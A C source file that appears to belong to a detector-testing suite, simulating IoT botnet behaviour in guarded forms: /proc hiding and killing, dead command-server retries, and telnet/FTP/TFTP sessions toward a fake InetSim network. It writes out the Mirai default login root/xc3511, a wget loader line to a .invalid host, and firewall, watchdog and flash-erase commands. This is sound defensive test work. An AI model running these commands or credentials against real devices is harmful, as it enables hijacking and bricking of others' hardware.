// SPDX-License-Identifier: GPL-3.0-only
// Copyright (c) 2026 MikiMiku (MoreMorePwn)
//
// iot.c — the 0.9.0 scenarios of an IoT bot: hiding and killing on the device,
// a dead command server, telnet/FTP/TFTP toward InetSim's fake victims, and
// what a bot does to the device itself (firewall, watchdog, flash).
//
// The harmless forms: every connection goes to the numeric --host (private or
// TEST-NET only for the logins and transfers; --wide adds 203.0.113.7 for the
// dead server); the mount calls carry flags the kernel refuses before it looks
// at anything; signals go only to children this sample forked; /dev/watchdog
// and /dev/mtd* are only stat()ed (opening the watchdog arms it); the flash
// erase ioctls go to a regular file in the work directory (ENOTTY); the
// commands that would change the device are exec stand-ins.
#include "samples.h"

#include <arpa/inet.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <mtd/mtd-abi.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <poll.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#ifndef SYS_open_tree
#define SYS_open_tree 428
#endif
#ifndef SYS_move_mount
#define SYS_move_mount 429
#endif
#define OPEN_TREE_CLONE_FLAG 1
#define MOVE_MOUNT_F_EMPTY_PATH_FLAG 0x4
// No mount-API call accepts this bit: the kernel returns EINVAL before it
// resolves a path or a descriptor.
#define REFUSED_FLAG 0x40000000

static void pause_ms(int milliseconds)
{
    struct timespec ts = {.tv_sec = milliseconds / 1000,
                          .tv_nsec = (long)(milliseconds % 1000) * 1000000L};
    while (nanosleep(&ts, &ts) != 0 && errno == EINTR)
        ;
}

// Waits for an own child at most limit_ms; kills that pid (and only it) when it overruns.
static int reap_bounded(pid_t pid, int limit_ms, int *status)
{
    for (int waited = 0; waited <= limit_ms; waited += 10) {
        pid_t done = waitpid(pid, status, WNOHANG);
        if (done == pid)
            return 0;
        if (done < 0 && errno != EINTR)
            return -1;
        pause_ms(10);
    }
    kill(pid, SIGKILL);
    waitpid(pid, status, 0);
    return -1;
}

// A child that only sleeps (at most `seconds`), as a victim for the signals.
static pid_t sleeper(int seconds)
{
    fflush(stdout);
    pid_t child = fork();
    if (child == 0) {
        pause_ms(seconds * 1000);
        _exit(0);
    }
    return child;
}

// Private (10/8, 172.16/12, 192.168/16, loopback, link-local) or a TEST-NET
// documentation block: never a real device on the Internet.
static int harmless_target(const char *host)
{
    return sample_is_private(host) || !strncmp(host, "192.0.2.", 8) ||
           !strncmp(host, "198.51.100.", 11) || !strncmp(host, "203.0.113.", 10);
}

// ---- pid-hide-killer ------------------------------------------------------------------

#define KILLER_VICTIMS 3
#define KILLER_SCAN 32

static int read_proc_file(pid_t pid, const char *leaf)
{
    char path[64], buffer[256];
    snprintf(path, sizeof path, "/proc/%d/%s", (int)pid, leaf);
    int fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0)
        return 0;
    ssize_t got = read(fd, buffer, sizeof buffer);
    close(fd);
    return got >= 0;
}

SCENARIO(pid_hide_killer)
{
    const char *name = "pid-hide-killer";
    pid_t victims[KILLER_VICTIMS];
    for (int i = 0; i < KILLER_VICTIMS; i++)
        victims[i] = sleeper(10);
    for (int i = 0; i < KILLER_VICTIMS; i++)
        if (victims[i] < 0) {
            sample_fail(name, "fork: %s", strerror(errno));
            for (int j = 0; j < i; j++) {
                kill(victims[j], SIGKILL);
                waitpid(victims[j], NULL, 0);
            }
            return 1;
        }

    // Kaiji's hiding, with flags the kernel refuses: open_tree(OPEN_TREE_CLONE)
    // of an empty directory and move_mount of it over /proc/<own child>.
    char target[64], empty[600];
    snprintf(target, sizeof target, "/proc/%d", (int)victims[0]);
    if (sample_path(empty, sizeof empty, options->workdir, ".empty") != 0 || sample_mkdir_p(empty) != 0)
        snprintf(empty, sizeof empty, "%s", options->workdir);
    long tree = syscall(SYS_open_tree, AT_FDCWD, empty, OPEN_TREE_CLONE_FLAG | REFUSED_FLAG);
    int tree_errno = errno;
    if (tree >= 0)
        close((int)tree);
    long moved = syscall(SYS_move_mount, -1, "", AT_FDCWD, target,
                         MOVE_MOUNT_F_EMPTY_PATH_FLAG | REFUSED_FLAG);
    int move_errno = errno;
    if (tree < 0 && moved < 0)
        sample_pass(name, "open_tree(OPEN_TREE_CLONE) refused (%s), move_mount over %s refused (%s): "
                       "nothing was mounted, pid %d stays visible",
                 strerror(tree_errno), target, strerror(move_errno), (int)victims[0]);
    else
        sample_note(name, "a mount call was not refused (open_tree %ld, move_mount %ld)", tree, moved);

    // The killer: list /proc and read what each process is, then SIGKILL; the
    // kills go only to this sample's own children.
    int scanned = 0;
    DIR *proc = opendir("/proc");
    if (proc) {
        struct dirent *entry;
        while ((entry = readdir(proc)) && scanned < KILLER_SCAN) {
            char *end = NULL;
            long pid = strtol(entry->d_name, &end, 10);
            if (pid <= 0 || *end)
                continue;
            scanned += read_proc_file((pid_t)pid, "cmdline");
        }
        closedir(proc);
    }
    int killed = 0;
    for (int i = 0; i < KILLER_VICTIMS; i++) {
        read_proc_file(victims[i], "cmdline");
        read_proc_file(victims[i], "status");
        read_proc_file(victims[i], "exe");
        int status = 0;
        if (kill(victims[i], SIGKILL) == 0 && reap_bounded(victims[i], 2000, &status) == 0 &&
            WIFSIGNALED(status) && WTERMSIG(status) == SIGKILL)
            killed++;
    }
    sample_pass(name, "read %d /proc/PID/cmdline entries, then SIGKILL to %d/%d own children "
                   "(pids %d, %d, %d)",
             scanned, killed, KILLER_VICTIMS, (int)victims[0], (int)victims[1], (int)victims[2]);

    // BusyBox-style applet rename: a copy of this binary named sh renames
    // itself to rm, once when asked to run rm and once when not.
    char directory[600], shell[700], junk[700], command[800];
    char self[512];
    if (sample_path(directory, sizeof directory, options->workdir, ".bin") != 0 ||
        sample_mkdir_p(directory) != 0 || sample_path(shell, sizeof shell, directory, "sh") != 0 ||
        sample_path(junk, sizeof junk, options->workdir, "junk") != 0 ||
        sample_self_path(self, sizeof self) != 0 || sample_copy_file(self, shell, 0755, 8u << 20) != 0) {
        sample_unavailable(name, "could not place the sh stand-in: %s", strerror(errno));
        return 0;
    }
    snprintf(command, sizeof command, "rm -rf %s", junk);
    char *const asked[] = {"sh", "-c", command, NULL};
    char *const not_asked[] = {"sh", "-c", "echo demo-check", NULL};
    char *const rename_env[] = {"SAMPLE_NOOP_NAME=rm", NULL};
    int first = sample_spawn(shell, asked, rename_env, "rename", NULL);
    int second = sample_spawn(shell, not_asked, rename_env, "rename", NULL);
    sample_pass(name, "sh stand-in renamed to rm after sh -c 'rm -rf ...' (exit %d, no finding "
                   "expected) and after sh -c 'echo demo-check' (exit %d, evasion.process_rename)",
             first, second);
    return 0;
}

// ---- dead-c2 --------------------------------------------------------------------------

#define DEAD_TRIES 12
#define DEAD_PORT 48101

static void on_alarm(int signal)
{
    (void)signal;
}

// A blocking connect (so the failure is the connect's own result) that sends
// its SYN twice at most (TCP_SYNCNT 1): a server that never answers gives
// ETIMEDOUT after about 3 s. An interval timer cuts it off after limit_ms
// whatever happens (EINTR then).
static int blocking_connect(const char *host, int port, int limit_ms)
{
    struct sockaddr_in address;
    memset(&address, 0, sizeof address);
    address.sin_family = AF_INET;
    address.sin_port = htons((uint16_t)port);
    if (inet_pton(AF_INET, host, &address.sin_addr) != 1) {
        errno = EINVAL;
        return -1;
    }
    int fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
    if (fd < 0)
        return -1;
    int syn_retries = 1;
    setsockopt(fd, IPPROTO_TCP, TCP_SYNCNT, &syn_retries, sizeof syn_retries);
    struct sigaction action, previous;
    memset(&action, 0, sizeof action);
    action.sa_handler = on_alarm; // no SA_RESTART: the connect returns EINTR
    sigemptyset(&action.sa_mask);
    sigaction(SIGALRM, &action, &previous);
    struct itimerval timer = {.it_value = {.tv_sec = limit_ms / 1000,
                                           .tv_usec = (limit_ms % 1000) * 1000}};
    struct itimerval off = {0};
    setitimer(ITIMER_REAL, &timer, NULL);
    int result = connect(fd, (struct sockaddr *)&address, sizeof address);
    int saved = errno;
    setitimer(ITIMER_REAL, &off, NULL);
    sigaction(SIGALRM, &previous, NULL);
    close(fd);
    errno = saved;
    return result;
}

static void retry_dead(const char *name, const char *host, int port, int count)
{
    int refused = 0, timed_out = 0, unreachable = 0, cut = 0, other = 0, tries = 0;
    for (; tries < count; tries++) {
        if (blocking_connect(host, port, 4000) == 0) {
            tries++;
            sample_note(name, "%s:%d accepted try %d: a live server, so this is no dead one "
                           "(no more tries)", host, port, tries);
            break;
        }
        switch (errno) {
        case ECONNREFUSED:
            refused++;
            break;
        case ETIMEDOUT:
            timed_out++;
            break;
        case ENETUNREACH:
        case EHOSTUNREACH:
            unreachable++;
            break;
        case EINTR:
            cut++;
            break;
        default:
            other++;
        }
        pause_ms(250);
    }
    sample_pass(name, "%d connects to %s:%d: %d refused, %d timed out, %d unreachable, %d cut off "
                   "after 4 s (EINTR, not counted by the rule), %d other",
             tries, host, port, refused, timed_out, unreachable, cut, other);
}

SCENARIO(dead_c2)
{
    const char *name = "dead-c2";
    const char *host = sample_host(options);
    int port = sample_port(options, DEAD_PORT);
    // A private address is never counted by the rule: a few tries show the
    // shape; a public (TEST-NET) --host gets the full count.
    retry_dead(name, host, port, sample_is_private(host) ? 4 : DEAD_TRIES);
    if (sample_is_private(host))
        sample_note(name, "%s is a private address: network.dead_c2 counts public ones only%s", host,
                 options->wide ? "" : " (pass --wide to also try 203.0.113.7)");
    if (options->wide)
        retry_dead(name, SAMPLE_TESTNET_PREFIX "7", port, DEAD_TRIES);
    else
        sample_skip(name, "the public retry toward 203.0.113.7 needs --wide");
    return 0;
}

// ---- inetsim-iot ----------------------------------------------------------------------

// Reads until `needle` (any case) appears, the peer closes or limit_ms
// passes; 1 when it appeared.
static int expect_text(int fd, const char *needle, char *seen, size_t cap, int limit_ms)
{
    size_t used = 0;
    seen[0] = '\0';
    for (int waited = 0; waited < limit_ms; waited += 250) {
        if (used + 1 >= cap)
            used = 0; // keep the tail small; a prompt is short
        struct pollfd ready = {.fd = fd, .events = POLLIN};
        if (poll(&ready, 1, 250) <= 0)
            continue;
        ssize_t got = recv(fd, seen + used, cap - 1 - used, 0);
        if (got <= 0)
            return 0;
        {
            // Telnet negotiation bytes and NULs are not text.
            for (ssize_t i = 0; i < got; i++)
                if (seen[used + (size_t)i] == '\0' || (unsigned char)seen[used + (size_t)i] >= 0xf0)
                    seen[used + (size_t)i] = ' ';
            used += (size_t)got;
            seen[used] = '\0';
            if (strcasestr(seen, needle))
                return 1;
        }
    }
    return 0;
}

static int send_line(int fd, const char *text)
{
    char line[512];
    int length = snprintf(line, sizeof line, "%s\r\n", text);
    return length > 0 && (size_t)length < sizeof line ? sample_send_all(fd, line, (size_t)length) : -1;
}

static void telnet_victim(const char *name, const char *host, int port)
{
    char seen[2048];
    int fd = sample_dial(host, port, 3000);
    if (fd < 0) {
        sample_unavailable(name, "telnet %s:%d: %s (network.inetsim_telnet_login needs the InetSim "
                              "route)", host, port, strerror(errno));
        return;
    }
    int prompt = expect_text(fd, "login", seen, sizeof seen, 4000);
    send_line(fd, "root");
    int password = expect_text(fd, "assword", seen, sizeof seen, 3000);
    send_line(fd, "xc3511");
    int shell = expect_text(fd, "#", seen, sizeof seen, 3000) && !strcasestr(seen, "incorrect");
    int typed = 0;
    if (shell) {
        // The probe and a loader line of a Mirai-style bot. The URL names a
        // .invalid host and the output goes to standard output: on a real
        // shell nothing is fetched or written.
        typed += send_line(fd, "/bin/busybox DEMOBOT") == 0;
        expect_text(fd, "#", seen, sizeof seen, 2000);
        typed += send_line(fd, "wget http://bins.example-loader.invalid/demo.x86 -O-") == 0;
        expect_text(fd, "#", seen, sizeof seen, 2000);
        typed += send_line(fd, "exit") == 0;
    }
    close(fd);
    sample_pass(name, "telnet %s:%d: login prompt %s, password prompt %s, root/xc3511 %s, %d lines "
                   "typed",
             host, port, prompt ? "seen" : "not seen", password ? "seen" : "not seen",
             shell ? "accepted" : "not accepted", typed);
}

// One FTP reply: reads until a whole line that starts with three digits and
// a space (the last line of a reply); returns its code, or -1.
static int ftp_reply(int fd, char *reply, size_t cap)
{
    size_t used = 0;
    reply[0] = '\0';
    for (int reads = 0; reads < 12 && used + 1 < cap; reads++) {
        ssize_t got = sample_recv_wait(fd, reply + used, cap - 1 - used, 2000);
        if (got <= 0)
            return -1;
        used += (size_t)got;
        reply[used] = '\0';
        for (char *line = reply; *line;) {
            char *end = strchr(line, '\n');
            if (!end)
                break;
            if (end - line >= 4 && line[0] >= '1' && line[0] <= '5' && line[3] == ' ')
                return atoi(line);
            line = end + 1;
        }
    }
    return -1;
}

static void ftp_retr(const char *name, const char *host, int port, const char *save)
{
    char reply[1024];
    int control = sample_dial(host, port, 3000);
    if (control < 0) {
        sample_unavailable(name, "ftp %s:%d: %s (network.inetsim_download needs the InetSim route)",
                        host, port, strerror(errno));
        return;
    }
    int code = ftp_reply(control, reply, sizeof reply);
    static const char *const steps[] = {"USER anonymous", "PASS demo@example.invalid", "TYPE I"};
    for (size_t i = 0; i < 3 && code > 0 && code < 400; i++) {
        send_line(control, steps[i]);
        code = ftp_reply(control, reply, sizeof reply);
    }
    unsigned a, b, c, d, high, low;
    char *open_paren = NULL;
    if (code > 0 && code < 400) {
        send_line(control, "PASV");
        code = ftp_reply(control, reply, sizeof reply);
        open_paren = strchr(reply, '(');
    }
    if (code != 227 || !open_paren ||
        sscanf(open_paren, "(%u,%u,%u,%u,%u,%u)", &a, &b, &c, &d, &high, &low) != 6 || high > 255 ||
        low > 255) {
        sample_unavailable(name, "ftp %s:%d: no passive-mode answer (last reply %d)", host, port, code);
        close(control);
        return;
    }
    // The data connection goes to --host whatever address the server named.
    int data_port = (int)(high * 256 + low);
    int data = sample_dial(host, data_port, 3000);
    if (data < 0) {
        sample_unavailable(name, "ftp data %s:%d: %s", host, data_port, strerror(errno));
        close(control);
        return;
    }
    send_line(control, "RETR demo.x86");
    code = ftp_reply(control, reply, sizeof reply);
    size_t total = 0;
    int out = open(save, O_WRONLY | O_CREAT | O_TRUNC | O_NOFOLLOW | O_CLOEXEC, 0600);
    char buffer[4096];
    for (int reads = 0; reads < 256 && total < (256u << 10); reads++) {
        ssize_t got = sample_recv_wait(data, buffer, sizeof buffer, 3000);
        if (got <= 0)
            break;
        total += (size_t)got;
        if (out >= 0)
            sample_write_all(out, buffer, (size_t)got);
    }
    if (out >= 0)
        close(out);
    close(data);
    int done = ftp_reply(control, reply, sizeof reply);
    send_line(control, "QUIT");
    ftp_reply(control, reply, sizeof reply);
    close(control);
    sample_pass(name, "ftp RETR demo.x86 from %s:%d (data port %d): %zu bytes saved, not run "
                   "(replies %d, %d)",
             host, port, data_port, total, code, done);
}

static void tftp_rrq(const char *name, const char *host, int port, const char *save)
{
    struct sockaddr_in server;
    memset(&server, 0, sizeof server);
    server.sin_family = AF_INET;
    server.sin_port = htons((uint16_t)port);
    if (inet_pton(AF_INET, host, &server.sin_addr) != 1)
        return;
    int fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
    if (fd < 0) {
        sample_unavailable(name, "tftp socket: %s", strerror(errno));
        return;
    }
    static const char request[] = "\0\1demo.mips\0octet";
    sendto(fd, request, sizeof request, 0, (struct sockaddr *)&server, sizeof server);
    int out = open(save, O_WRONLY | O_CREAT | O_TRUNC | O_NOFOLLOW | O_CLOEXEC, 0600);
    unsigned expected = 1;
    size_t total = 0;
    int blocks = 0, error = 0;
    unsigned char packet[516];
    while (blocks < 128) {
        struct pollfd ready = {.fd = fd, .events = POLLIN};
        if (poll(&ready, 1, 2000) <= 0)
            break;
        struct sockaddr_in from;
        socklen_t from_len = sizeof from;
        ssize_t got = recvfrom(fd, packet, sizeof packet, 0, (struct sockaddr *)&from, &from_len);
        if (got < 4)
            break;
        if (from.sin_addr.s_addr != server.sin_addr.s_addr)
            continue; // only --host is listened to
        unsigned opcode = (unsigned)packet[0] << 8 | packet[1];
        unsigned block = (unsigned)packet[2] << 8 | packet[3];
        if (opcode == 5) {
            error = 1;
            break;
        }
        if (opcode != 3)
            break;
        if (block == expected) {
            if (out >= 0)
                sample_write_all(out, packet + 4, (size_t)(got - 4));
            total += (size_t)(got - 4);
            blocks++;
            expected++;
        }
        unsigned char ack[4] = {0, 4, packet[2], packet[3]};
        sendto(fd, ack, sizeof ack, 0, (struct sockaddr *)&from, sizeof from);
        if (got < 516)
            break;
    }
    if (out >= 0)
        close(out);
    close(fd);
    if (blocks)
        sample_pass(name, "tftp RRQ demo.mips from %s:%d: %d blocks, %zu bytes saved, not run", host,
                 port, blocks, total);
    else
        sample_unavailable(name, "tftp RRQ demo.mips to %s:%d: %s", host, port,
                        error ? "the server answered with an error" : "no answer within 2 s");
}

SCENARIO(inetsim_iot)
{
    const char *name = "inetsim-iot";
    const char *host = sample_host(options);
    if (!harmless_target(host)) {
        sample_skip(name, "refused: --host %s is neither private nor TEST-NET, so no login or "
                       "transfer is tried", host);
        return 0;
    }
    char directory[600], ftp_file[700], tftp_file[700];
    if (sample_path(directory, sizeof directory, options->workdir, ".dl") != 0 ||
        sample_mkdir_p(directory) != 0 ||
        sample_path(ftp_file, sizeof ftp_file, directory, "ftp-demo.x86") != 0 ||
        sample_path(tftp_file, sizeof tftp_file, directory, "tftp-demo.mips") != 0) {
        sample_fail(name, "work directory: %s", strerror(errno));
        return 1;
    }
    telnet_victim(name, host, sample_port(options, 23));
    ftp_retr(name, host, sample_port(options, 21), ftp_file);
    tftp_rrq(name, host, sample_port(options, 69), tftp_file);
    sample_note(name, "nothing received is executed; the loader line names a .invalid host");
    return 0;
}

// ---- iot-device -----------------------------------------------------------------------

SCENARIO(iot_device)
{
    const char *name = "iot-device";
    // The device nodes a bot looks for, by stat only.
    static const char *const nodes[] = {"/dev/watchdog", "/dev/watchdog0", "/dev/misc/watchdog",
                                        "/dev/mtd0", "/dev/mtdblock0"};
    char present[256] = "";
    int found = 0;
    for (size_t i = 0; i < sizeof nodes / sizeof nodes[0]; i++) {
        struct stat info;
        if (stat(nodes[i], &info) == 0) {
            found++;
            strncat(present, " ", sizeof present - strlen(present) - 1);
            strncat(present, nodes[i], sizeof present - strlen(present) - 1);
        }
    }
    sample_pass(name, "stat of %zu watchdog and flash nodes: %d present%s", sizeof nodes / sizeof nodes[0],
             found, found ? present : "");
    char partitions[1024];
    int fd = open("/proc/mtd", O_RDONLY | O_CLOEXEC);
    if (fd >= 0) {
        ssize_t got = read(fd, partitions, sizeof partitions - 1);
        close(fd);
        int lines = 0;
        for (ssize_t i = 0; i < got; i++)
            lines += partitions[i] == '\n';
        sample_note(name, "/proc/mtd lists %d partitions", lines > 0 ? lines - 1 : 0);
    } else {
        sample_note(name, "/proc/mtd: %s (no flash on this machine)", strerror(errno));
    }

    // The commands, as stand-ins.
    char rules[600];
    if (sample_path(rules, sizeof rules, options->workdir, "rules.v4") != 0 ||
        sample_write_text(rules, "*filter\n-A INPUT -p tcp --dport 23 -j DROP\nCOMMIT\n") != 0) {
        sample_fail(name, "work directory: %s", strerror(errno));
        return 1;
    }
    static const struct spoof commands[] = {
        {"evasion.firewall_modify",
         {"iptables", "-A", "INPUT", "-p", "tcp", "--dport", "23", "-j", "DROP", NULL}},
        {"evasion.firewall_modify",
         {"iptables", "-D", "INPUT", "-p", "tcp", "--dport", "2323", "-j", "ACCEPT", NULL}},
        {"evasion.firewall_modify", {"iptables", "-P", "INPUT", "DROP", NULL}},
        {"-", {"busybox", "watchdog", "-T", "3600", "-F", "/dev/watchdog", NULL}},
        {"-", {"flash_erase", "/dev/mtd0", "0", "0", NULL}},
        {"-", {"flash_eraseall", "-j", "/dev/mtd3", NULL}},
        {"-", {"mtd", "erase", "config", NULL}},
    };
    int ran = sample_spoof_all(name, commands, sizeof commands / sizeof commands[0]);
    char *const restore[] = {"iptables-restore", rules, NULL};
    ran += sample_spoof(restore, NULL) == 0;
    sample_pass(name, "%d/%zu stand-ins: iptables -A/-D/-P, iptables-restore, watchdog, "
                   "flash_erase, flash_eraseall, mtd erase",
             ran, sizeof commands / sizeof commands[0] + 1);

    // MEMERASE and MEMERASE64 on a regular file that looks like the flash: a
    // regular file has no such ioctl, so the kernel refuses both.
    char flash_dir[600], flash[700];
    unsigned char erased[4096];
    memset(erased, 0xff, sizeof erased);
    if (sample_path(flash_dir, sizeof flash_dir, options->workdir, "flash") != 0 ||
        sample_mkdir_p(flash_dir) != 0 || sample_path(flash, sizeof flash, flash_dir, "mtd0") != 0 ||
        sample_write_bytes(flash, erased, sizeof erased, 0600) != 0) {
        sample_fail(name, "work directory: %s", strerror(errno));
        return 1;
    }
    fd = open(flash, O_RDWR | O_CLOEXEC | O_NOFOLLOW);
    if (fd < 0) {
        sample_fail(name, "%s: %s", flash, strerror(errno));
        return 1;
    }
    struct erase_info_user erase = {.start = 0, .length = sizeof erased};
    struct erase_info_user64 erase64 = {.start = 0, .length = sizeof erased};
    int first = ioctl(fd, MEMERASE, &erase);
    int first_errno = errno;
    int second = ioctl(fd, MEMERASE64, &erase64);
    int second_errno = errno;
    close(fd);
    sample_pass(name, "MEMERASE %s, MEMERASE64 %s on %s (a regular file)",
             first == 0 ? "accepted" : strerror(first_errno),
             second == 0 ? "accepted" : strerror(second_errno), flash);
    sample_note(name, "/dev/watchdog is never opened (that arms it) and nothing the run did not "
                   "start is killed: watchdog_disable and service_takeover stay quiet on purpose");
    return 0;
}
